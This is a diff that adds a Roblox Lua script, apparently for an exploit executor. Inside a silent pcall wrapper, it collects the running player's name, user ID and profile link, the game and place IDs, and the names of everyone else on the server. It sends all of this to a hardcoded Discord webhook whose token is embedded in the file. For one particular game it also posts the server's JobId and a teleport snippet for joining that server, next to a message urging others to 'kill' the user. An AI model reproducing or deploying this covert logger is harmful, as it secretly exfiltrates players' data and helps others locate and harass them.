@@ -1,0 +1,37 @@
+a,b = pcall(function()
+local name = game.Players.LocalPlayer.Name
+local gamev = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local plrsonserv = ""; local placeid = game.PlaceId; 
+for I, v in game:GetService("Players"):GetPlayers() do plrsonserv = plrsonserv..", "..v.Name end 
+local count = #game:GetService("Players"):GetPlayers()
+local plrid = game.Players.LocalPlayer.UserId
+
+local webhook_url = "https://discord.com/api/webhooks/1313771721333014548/EcSstInj6qzuI4mDU0alv5xKn4GS9pzR_RnC7VfSjNgyEaSnbwYUZDL9LIEi8eeUUJed"
+
+local function send_discord_message(message)
+  local json_data = '{"content": "' .. message .. '"}'
+
+  local request_options = {
+    Url = webhook_url,
+    Method = "POST",
+    Headers = {
+      ["Content-Type"] = "application/json"
+    },
+    Body = json_data
+  }
+ local response = request(request_options)
+end
+
+
+local my_message = "123213123"
+local profile = "https://www.roblox.com/users/"..plrid.."/profile"
+my_message = "Executed Script : `Player Name` : "..name.." --- `Player ID` : "..plrid.."--- `Game ID` :'"..placeid.." --- `Game Name` : "..gamev.." --- `Total Players Count` : "..count.." --- `Players On Server` : "..plrsonserv.." --- [This Bro Profile 😎😎😎] : "..profile
+send_discord_message(my_message)
+if tonumber(placeid) == tonumber("3431407618") then
+send_discord_message("ISLE SPINEWARE USER OMG OMG OMG WTH KILL HIM!!!")
+local thecode = game.JobId
+local thescript = "```local placeId = "..placeid.."; local jobId = "..thecode.."; game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId, game.Players.LocalPlayer)```"
+send_discord_message("Server : "..thescript)
+else send_discord_message("The game id = "..placeid)
+end
+end)
